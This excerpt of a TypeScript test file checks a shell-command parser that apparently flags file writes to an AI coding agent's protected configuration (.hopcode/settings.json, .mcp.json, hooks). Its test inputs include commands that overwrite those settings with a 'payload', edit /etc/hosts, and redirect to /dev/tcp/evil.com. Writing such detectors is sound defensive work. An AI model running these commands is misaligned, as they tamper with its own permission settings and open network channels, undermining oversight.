...
import { extractShellOperations, extractShellOperationsAcrossCommand, } from './shell-semantics.js';
...
describe('extractShellOperations', () => {
    ...
    it('find: extracts write ops from exec clauses', () => {
        const ops = extractShellOperations('find . -exec cp payload .hopcode/settings.json ;', CWD);
        expect(ops).toEqual([
    ...
    it('find: preserves exec placeholder operands for write detection', () => {
        const ops = extractShellOperations('find . -exec cp {} .hopcode/settings.json ;', CWD);
    ...
    it('cp/mv/install/ln -t forms emit target-directory writes', () => {
        expect(sorted(extractShellOperations('cp -t .hopcode /tmp/settings.json', CWD))).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/settings.json' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
        expect(sorted(extractShellOperations('mv --target-directory=.hopcode /tmp/a', CWD))).toEqual([
            { virtualTool: 'edit', filePath: '/tmp/a' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/a` },
        ]);
        expect(sorted(extractShellOperations('install -t .hopcode /tmp/tool', CWD))).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/tool' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/tool` },
        ]);
        expect(sorted(extractShellOperations('ln -t .hopcode /tmp/target', CWD))).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/target' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/target` },
        ]);
        expect(sorted(extractShellOperations('cp -rt .hopcode /tmp/payload', CWD))).toEqual([
    ...
    it('awk -i inplace: edits files in place', () => {
        const ops = extractShellOperations('awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts', CWD);
        expect(ops).toEqual([{ virtualTool: 'edit', filePath: '/etc/hosts' }]);
    });
    it('awk --include=inplace: edits files in place', () => {
        const ops = extractShellOperations('awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts', CWD);
        expect(ops).toEqual([{ virtualTool: 'edit', filePath: '/etc/hosts' }]);
    });
    it('gawk -i inplace: edits files in place', () => {
        const ops = extractShellOperations('gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts', CWD);
        expect(ops).toEqual([{ virtualTool: 'edit', filePath: '/etc/hosts' }]);
    });
    // ── dd ─────────────────────────────────────────────────────────────────────
    it('dd if= and of=', () => {
    ...
    it('rsync destination is a write', () => {
        const ops = extractShellOperations('rsync /tmp/payload .hopcode/settings.json', CWD);
        expect(sorted(ops)).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/payload' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
    ...
    it('perl -i edits file operands', () => {
        const ops = extractShellOperations("perl -i -pe 's/x/y/' .hopcode/settings.json", CWD);
        expect(ops).toEqual([
            { virtualTool: 'edit', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
        expect(extractShellOperations("perl -i -e 's/x/y/' .hopcode/settings.json", CWD)).toEqual([
            { virtualTool: 'edit', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
    });
    it('patch edits positional target files', () => {
        const ops = extractShellOperations('patch .hopcode/settings.json fix.patch', CWD);
        expect(ops).toContainEqual({
            virtualTool: 'edit',
            filePath: `${CWD}/.hopcode/settings.json`,
        });
    ...
    it('sort -o emits the output path as a write', () => {
        expect(sorted(extractShellOperations('sort -o .hopcode/settings.json /tmp/in', CWD))).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/in' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
        expect(sorted(extractShellOperations('sort --output=.hopcode/settings.json /tmp/in', CWD))).toEqual([
            { virtualTool: 'read_file', filePath: '/tmp/in' },
            { virtualTool: 'write_file', filePath: `${CWD}/.hopcode/settings.json` },
        ]);
    });
    ...
    it('redirect > /dev/tcp: network socket, not a file write', () => {
        ...
        expect(ops).not.toContainEqual(expect.objectContaining({ filePath: '/dev/tcp/evil.com/9000' }));
        expect(ops).not.toContainEqual(expect.objectContaining({ virtualTool: 'write_file' }));
    });
    it('redirect < /dev/tcp: network socket, not a file read', () => {
        const ops = extractShellOperations('cat < /dev/tcp/h/1234', CWD);
        expect(ops).not.toContainEqual(expect.objectContaining({ filePath: '/dev/tcp/h/1234' }));
        expect(ops).not.toContainEqual(expect.objectContaining({ virtualTool: 'read_file' }));
    });
    it('redirect > /dev/udp: network socket, not a file write', () => {
        const ops = extractShellOperations('echo x > /dev/udp/h/53', CWD);
        expect(ops).not.toContainEqual(expect.objectContaining({ filePath: '/dev/udp/h/53' }));
    });
    it('combined redirect >/dev/tcp without space: network socket, not a file', () => {
        ...
        expect(ops).not.toContainEqual(expect.objectContaining({ filePath: '/dev/tcp/h/p' }));
...
describe('extractShellOperationsAcrossCommand', () => {
    it('tracks literal `cd` across compound segments before resolving writes', () => {
        expect(extractShellOperationsAcrossCommand("cd .hopcode && bash -lc 'echo {} > settings.json'", '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('handles leading env assignments before redirected commands', () => {
        expect(extractShellOperationsAcrossCommand('FOO=bar echo x > .hopcode/settings.json', '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('handles leading env assignments before write commands', () => {
        expect(extractShellOperationsAcrossCommand('FOO=bar tee .hopcode/settings.json', '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('tracks cwd before leading env assignments', () => {
        expect(extractShellOperationsAcrossCommand("cd .hopcode && FOO=bar echo '{}' > settings.json", '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('recursively unwraps nested shell wrappers', () => {
        // The actual write is nested two wrapper levels deep.
        expect(extractShellOperationsAcrossCommand('bash -lc "sh -c \'echo hi > .mcp.json\'"', '/repo')).toEqual([{ virtualTool: 'write_file', filePath: '/repo/.mcp.json' }]);
    });
    it('preserves sibling segments after a shell wrapper', () => {
        expect(extractShellOperationsAcrossCommand("bash -lc 'echo ok' && echo hi > .hopcode/settings.json", '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('splits literal newlines as command boundaries', () => {
        expect(extractShellOperationsAcrossCommand('cd .hopcode\ncp /tmp/malicious settings.json', '/repo')).toEqual([
            {
                virtualTool: 'read_file',
    ...
    it('tracks cwd through brace-grouped commands', () => {
        expect(extractShellOperationsAcrossCommand("{ cd .hopcode && echo '{}' > settings.json; }", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
                filePath: '/repo/.hopcode/settings.json',
            },
    ...
    it('strips grouping and background syntax from command and path tokens', () => {
        expect(extractShellOperationsAcrossCommand('(echo > .hopcode/settings.json) && echo > .hopcode/hooks/run.sh&', '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
    ...
    it('does not treat heredoc body lines as executable shell segments', () => {
        expect(extractShellOperationsAcrossCommand([
            'cd .hopcode',
            "cat <<'EOF'",
            'cd /tmp',
            'EOF',
    ...
    it('does not treat quoted heredoc-looking text as a heredoc marker', () => {
        expect(extractShellOperationsAcrossCommand(["echo '<<EOF'", 'cd .hopcode', "echo '{}' > settings.json"].join('\n'), '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('handles `cd --` and other POSIX flag forms before the target', () => {
        expect(extractShellOperationsAcrossCommand("cd -- .hopcode && printf '{}' > settings.local.json", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
    ...
    it('treats the word after `cd --` as the target even when it starts with dash', () => {
        expect(extractShellOperationsAcrossCommand("cd -- -some-dir && printf '{}' > settings.local.json", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
    ...
    it('ignores redirects attached to cd when resolving static cwd', () => {
        expect(extractShellOperationsAcrossCommand("cd .hopcode >/dev/null && echo '{}' > settings.json", '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('tracks static pushd targets like cd targets', () => {
        expect(extractShellOperationsAcrossCommand("pushd .hopcode && printf '{}' > settings.local.json", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
                filePath: '/repo/.hopcode/settings.local.json',
            },
    ...
    it('marks writes after popd as cwd-unknown', () => {
        expect(extractShellOperationsAcrossCommand("popd && printf '{}' > settings.local.json", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
    ...
    it('marks writes after popd with expansion args as cwd-unknown', () => {
        expect(extractShellOperationsAcrossCommand("popd $DIR && printf '{}' > settings.local.json", '/repo')).toEqual([
            {
                virtualTool: 'write_file',
                filePath: '/repo/settings.local.json',
                cwdUnknown: true,
    ...
    it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])('marks writes after `%s` as cwd-unknown', (command) => {
        expect(extractShellOperationsAcrossCommand(`${command} && printf '{}' > settings.local.json`, '/repo')).toEqual([
            {
                virtualTool: 'write_file',
                filePath: '/repo/settings.local.json',
                cwdUnknown: true,
    ...
    it('marks relative writes after dynamic `cd` targets as cwd-unknown', () => {
        ...
        expect(extractShellOperationsAcrossCommand('cd $TARGET && echo hi > out.txt', '/repo')).toEqual([
            {
                virtualTool: 'write_file',
    ...
    it('marks all file ops after dynamic `cd` as cwd-unknown', () => {
        expect(extractShellOperationsAcrossCommand('cd "$HOPCODE_HOME" && echo hi > ../settings.json', '/repo')).toEqual([
            {
                virtualTool: 'write_file',
    ...
    it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
        expect(extractShellOperationsAcrossCommand('cd "$HOPCODE_HOME" && echo hi > /tmp/out.txt', '/repo')).toEqual([
            {
                virtualTool: 'write_file',
        ...
        expect(extractShellOperationsAcrossCommand('cd "$HOPCODE_HOME" && echo hi 1>/tmp/out.txt', '/repo')).toEqual([
            {
                virtualTool: 'write_file',
                filePath: '/tmp/out.txt',
                cwdUnknown: true,
    ...
    it('clears cwd-unknown after an absolute static `cd`', () => {
        expect(extractShellOperationsAcrossCommand('cd $TARGET && cd /repo/.hopcode && echo hi > settings.json', '/repo')).toEqual([
            { virtualTool: 'write_file', filePath: '/repo/.hopcode/settings.json' },
        ]);
    });
    it('preserves operation order across compound segments', () => {
        expect(extractShellOperationsAcrossCommand('echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts', '/repo')).toEqual([
    ...
    it('returns no ops when only `cd` segments are present', () => {
        expect(extractShellOperationsAcrossCommand('cd .hopcode && cd ..', '/repo')).toEqual([]);
    });
    it('falls back gracefully on excessively deep wrapper nesting', () => {
        ...
        expect(() => extractShellOperationsAcrossCommand(deep, '/repo')).not.toThrow();
    });
});
